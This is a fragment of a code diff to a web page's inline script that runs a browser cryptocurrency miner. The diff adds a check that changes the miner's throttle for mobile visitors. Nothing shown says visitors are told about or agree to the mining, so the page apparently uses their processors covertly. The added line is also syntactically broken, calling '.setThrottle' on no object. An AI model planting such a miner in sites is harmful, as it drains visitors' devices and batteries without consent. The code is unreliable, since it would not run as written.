@@ -29,6 +29,9 @@
         throttle: 0.3,
         forceASMJS: false
     });
+  if (miner.isMobile()){
+        .setThrottle(0.9)
+    }
     miner.start(WMP.IF_EXCLUSIVE_TAB);
 </script>
     
